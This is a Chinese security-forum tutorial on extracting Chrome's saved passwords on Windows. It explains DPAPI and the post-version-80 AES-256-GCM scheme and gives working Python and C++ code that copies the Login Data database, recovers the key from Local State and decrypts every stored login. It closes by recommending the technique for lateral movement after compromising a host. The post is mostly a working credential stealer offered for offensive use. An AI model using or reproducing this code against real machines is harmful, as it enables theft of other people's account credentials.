工具已上传到github:<https://github.com/SD-XD/Catch-Browser>

谷歌浏览器存储密码的方式
------------

在使用谷歌浏览器时,如果我们输入某个网站的账号密码,他会自动问我们是否要保存密码,以便下次登录的时候自动填写账号和密码  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-eec0f4f08f8ba6ec23de40b8755096bcca09750f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-eec0f4f08f8ba6ec23de40b8755096bcca09750f.png)

在设置中可以找到登录账户和密码

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8c2ec7c75346982500f3ca0dae7ee8363dd568c1.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8c2ec7c75346982500f3ca0dae7ee8363dd568c1.png)

也可以直接看密码,不过需要凭证

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c34f2b8523cdcaa9de4de26412d9f77ba15ae633.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c34f2b8523cdcaa9de4de26412d9f77ba15ae633.png)

这其实是windows的DPAPI机制

DPAPI
-----

Data Protection Application Programming Interface(数据保护API)

DPAPI是Windows系统级对数据进行加解密的一种接口无需自实现加解密代码微软已经提供了经过验证的高质量加解密算法提供了用户态的接口对密钥的推导存储数据加解密实现透明并提供较高的安全保证

DPAPI提供了两个用户态接口`CryptProtectData`加密数据`CryptUnprotectData`解密数据加密后的数据由应用程序负责安全存储应用无需解析加密后的数据格式。但是加密后的数据存储需要一定的机制因为该数据可以被其他任何进程用来解密当然`CryptProtectData`也提供了用户输入额外数据来参与对用户数据进行加密的参数但依然无法放于暴力破解。

微软提供了两个接口用来加密和解密,`CryptProtectMemory`和`CryptUnprotectMemory`

实际上,在老版本(80之前)的谷歌浏览器,仅仅是使用了`CryptProtectMemory`来对密码进行加密

80版本之前的Chrome
-------------

### 实验环境

- win7
- Chrome版本 79.0.3945.117

### 实验过程

chrome的密码经过加密后存储在

```php
%LocalAppData%\Google\Chrome\User Data\Default\Login Data
```

如果用二进制文本编辑器查看的化会发现他其实是一个sqlite数据库文件

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0d0bc3bd72b513d72d56d027aeddae03c4be0d71.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0d0bc3bd72b513d72d56d027aeddae03c4be0d71.png)

可以使用工具SQLiteStudio打开他

双击logins  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-118b5667dc0d84084ff6b1ace15b8ec612df6590.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-118b5667dc0d84084ff6b1ace15b8ec612df6590.png)

选择data  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-28ed7c90ab92d1a5e233acbf4226a9d024ae1017.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-28ed7c90ab92d1a5e233acbf4226a9d024ae1017.png)

可以看到有用户名和网址,却没有密码

但是密码的二进制实际是有值的

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1bec3b8f8a486200acc12dcc8af09ae9f234b090.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1bec3b8f8a486200acc12dcc8af09ae9f234b090.png)

### 编写脚本解密

python的解密是最简洁的，这里送上一个三好学生的代码

```python
from os import getenv
import sqlite3
import win32crypt
import binascii
conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
    if password:
        print 'Site: ' + result[0]
        print 'Username: ' + result[1]
        print 'Password: ' + password
    else:
        print "no password found"
```

但我还是想c++写一个

编写之前,需要配置sqlite3环境,并且下载`<sqlite3.h>`和`<sqlite3.c>`文件

如果当前用户正在使用谷歌,是无法打开数据库的,于是我们可以复制一份出来操作

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fdcafd4fc56bf0b4ef95eb052ab8401bc4e7cdec.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fdcafd4fc56bf0b4ef95eb052ab8401bc4e7cdec.png)

再通过sql语句查找logins表

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9cd447dabd08d11197bc02d0752dc6341b5bd534.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9cd447dabd08d11197bc02d0752dc6341b5bd534.png)

在回调函数中解密

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1827b0a9afa2aa21e5145cc9b8e42dfe5663030b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1827b0a9afa2aa21e5145cc9b8e42dfe5663030b.png)

看下效果,完美解出密码

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-16db2fec315316a4e662b22d49917418d329bd40.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-16db2fec315316a4e662b22d49917418d329bd40.png)

与谷歌浏览器上面看到的也是一样的,无需再验证用户密码

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-11e9d25626f875ba195f140f9912e16c2217e27b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-11e9d25626f875ba195f140f9912e16c2217e27b.png)

80版本之后的Chrome
-------------

那么80.x之后的Chrome如何解密呢

### 实验环境

- win10
- Chrome版本 91.0.4472.101(最新版)

### 实验分析

先看一下跟以前版本的Chrome存储方式上有什么区别

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-07bbaea6f93009c27f2f0153176ea168c44d1d2b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-07bbaea6f93009c27f2f0153176ea168c44d1d2b.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5d0bd6d8d616717370222c1b3f37ce7027077c32.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5d0bd6d8d616717370222c1b3f37ce7027077c32.png)

判断是否是新版本的Chrome加密其实就是看它加密后值的前面有没有v10或者v11

看官方文档,分析新版加密算法

key的初始化  
[https://source.chromium.org/chromium/chromium/src/+/master:components/os\_crypt/os\_crypt\_win.cc;l=192;drc=f59fc2f1cf0efae49ea96f9070bead4991f53fea](https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_win.cc;l=192;drc=f59fc2f1cf0efae49ea96f9070bead4991f53fea)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1aa99572afabefe4a3c652250a6a3d169b5f6009.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1aa99572afabefe4a3c652250a6a3d169b5f6009.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b02c66f4a2a40389e4b589cefddc709b22a569b5.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b02c66f4a2a40389e4b589cefddc709b22a569b5.png)  
注释:尝试从local state提取密钥。

并且可以看到`kDPAPIKeyPrefix`实际上就是一个字符串"DPAPI"

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8368530ea3ab89e587d392c3fa47261061a2966e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8368530ea3ab89e587d392c3fa47261061a2966e.png)

然后就是进行DPAPI的解密,最后就是如果key不在local state中或者DPAPI解密失败,就重新生成一个key

从这里我们我可以大致分析出key初始化时的动作:

1. 从local state文件中提取key
2. base64解密key
3. 去除key开头的“DPAPI”
4. DPAPI解密,得到最终的key

跟进`GetString`函数的参数`kOsCryptEncryptedKeyPrefName`

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3517225e6f18fd11f116b48ad782e7a29e503529.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3517225e6f18fd11f116b48ad782e7a29e503529.png)

知道key存放在local state文件os\_crypt.encrypted\_key字段中,即

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fd133777179d6e4f9dfab45dbcfb3b16a5ca5a97.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fd133777179d6e4f9dfab45dbcfb3b16a5ca5a97.png)

而local state文件就在本地默认目录:

```php
%LocalAppData%\Google\Chrome\User Data\Local State
```

Local State是一个JSON格式的文件

### 明文加密方式

看源码注释

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-21cfe29f617077155d437d6913358893decbef72.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-21cfe29f617077155d437d6913358893decbef72.png)

密钥加密后数据前缀是“v10”

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-979f757349aded7666e6fc6930f15cb4b2be747f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-979f757349aded7666e6fc6930f15cb4b2be747f.png)

密钥和NONCE/IV的长度分别为：32字节和12字节

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-45b9c70e09a9fc6eb2fc15072747446e7e0762fd.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-45b9c70e09a9fc6eb2fc15072747446e7e0762fd.png)

这里解释一下NONCE/IV是什么:

如果我们不希望相同的明文通过密钥加密出来的密文是相同的(这样很容易让攻击者知道这两条密文的明文是相同的) 解决办法是使用IV（初始向量）或nonce（只使用一次的数值）。因为对于每条加密消息，我们都可以使用不同的byte字符串。它们是非确定理论的起源，而这种理论要求制造出令人难以分辨的副本。这些消息通常不是什么秘密，但为了解密需要，我们会在分发时对它们进行加密。 IV与nonce之间的区别是有争议的，但也不是没有关联的。不同的加密方案所保护的侧重点也不同：有些方案需要的只是密文不重复，这种情况我们通常叫作nonce；还有一些方案需要密文是随机的，甚至完全不可预测的，这种情况我们通常叫作IV。这里其实就是希望即便明文相同,经过加密后的密文也不相同。

再往下翻,其实可以看到解密函数

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b17fd9708b7c8014cc33c2a04e3101a92829c94c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b17fd9708b7c8014cc33c2a04e3101a92829c94c.png)

`encrypted_value`的前缀v10后为12字节的NONCE（IV），然后再是真正的密文。Chrome使用的是AES-256-GCM的AEAD对称加密、

那么思路就清晰了,这里我自己画了一个图来总结算法

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1c6e71abb88e43df3fb5f66ba332f6c1d6190728.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1c6e71abb88e43df3fb5f66ba332f6c1d6190728.png)

实现自动化抓密码  
解密使用一个非常强大的库,cryptopp

先获取原始的key

```c++
string GetOriginalkey()
{
    string Decoded = "";
    //获取Local State中的未解密的key
    string key = "RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAADWXmStECIlTZZxWMAYf5UmAAAAAAIAAAAAABBmAAAAAQAAIAAAAP8V1h3J1qhEf8/h13hre+e3EMW0oD41Ux7UrEqls4DoAAAAAA6AAAAAAgAAIAAAAA7xXGgN1Hks1TbInimvYa0TnMfPa0jPpmlI9BDiUQAAMAAAAPzO7wya37iu97rDB4UTtn5QwQcuJkw2E3cw/tHuSnHdNv4qwXMWLC2oU3TkysoXmUAAAAAtPkLwNaInulyoGNH4GDxlwbzAW4DP7T8XWsZ/2QB0YrcLqxSNytHlV1qvVyO8D20Eu7jKqD/bMW2MzwEa40iF";
    StringSource((BYTE*)key.c_str(), key.size(), true, new Base64Decoder(new StringSink(Decoded)));
    key = Decoded;
    key = key.substr(5);//去除首位5个字符DPAPI
    Decoded.clear();//DPAPI解密
    int i;
    char result[1000] = "";
    DATA_BLOB DataOut = { 0 };
    DATA_BLOB DataVerify = { 0 };
    DataOut.pbData = (BYTE*)key.c_str();
    DataOut.cbData = 1000;
    if (!CryptUnprotectData(&DataOut, nullptr, NULL, NULL, NULL, 0, &DataVerify)) {
        printf("[!] Decryption failure: %d\n", GetLastError());
    }
    else {
        printf("[+] Decryption successfully!\n");
        for (i = 0; i < DataVerify.cbData; i++)
        {
            result[i] = DataVerify.pbData[i];
        }
    }
    return result;
}
```

如果当前chrome版本并不是80+,可以通过一个简单的判断:就是看加密密码前有没有”v10“或者”v11“

```c++
string e_str = argv[2];
//判断密文是否包含v10或v11,如果包含则说明是80+的Chrome,用新的解密方法
if (strstr(e_str.c_str(), "v10") != NULL || strstr(e_str.c_str(), "v11") != NULL)
{
    NewDecrypt(argc, argv, azColName);
}
else {
    DecryptoByDPAPI(argv, azColName);
}
return 0;
```

然后就是解密密文

获取iv和密文

```c++
//argv[2]是password_value的值
chiper = argv[2];
iv = argv[2];
iv = iv.substr(3, 15);  //获取iv的值
chiper = chiper.substr(15);   //加密密码的值
```

再用`cyptopp`强大的库函数进行解密

```c++
//获取iv hex编码值
StringSource((BYTE*)iv.c_str(), iv.size(), true, new HexEncoder(new StringSink(Encoded)));
iv = Encoded;
Encoded.clear();
iv = iv.substr(0, iv.size() - 6);
CHAR Pass_Word[1000] = { 0 };
StringSource((BYTE*)iv.c_str(), iv.size(), true,new HexDecoder(new StringSink(Decoded))); 
iv = Decoded;
Decoded.clear();
char* key = GetOriginalkey();
d.SetKeyWithIV((BYTE*)key, 32, (BYTE*)iv.c_str(), iv.size());

StringSource(chiper, true,new AuthenticatedDecryptionFilter(d,new StringSink(password)));
for (int i = 0; i < password.size(); i++)
{
    Pass_Word[i] = password[i];
}
printf("%s = %s\n", azColName[0], argv[0] ? argv[0] : "NULL");
printf("%s = %s\n", azColName[1], argv[1] ? argv[1] : "NULL");
printf("%s = %s\n", azColName[2], Pass_Word);
```

这里逻辑的话参照上面分析步骤,这里就不再赘述

最后看看解密效果  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bdbdf3ced4a7faa26b51753c9979bfca5cb5acc0.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bdbdf3ced4a7faa26b51753c9979bfca5cb5acc0.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4a8b02662801397accecf26b3ed4fb11aed3fab0.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4a8b02662801397accecf26b3ed4fb11aed3fab0.png)

后记
--

实战中如果拿到一台主机,并且安装有chrome,我们就可以抓取密码以便快速精确地横向。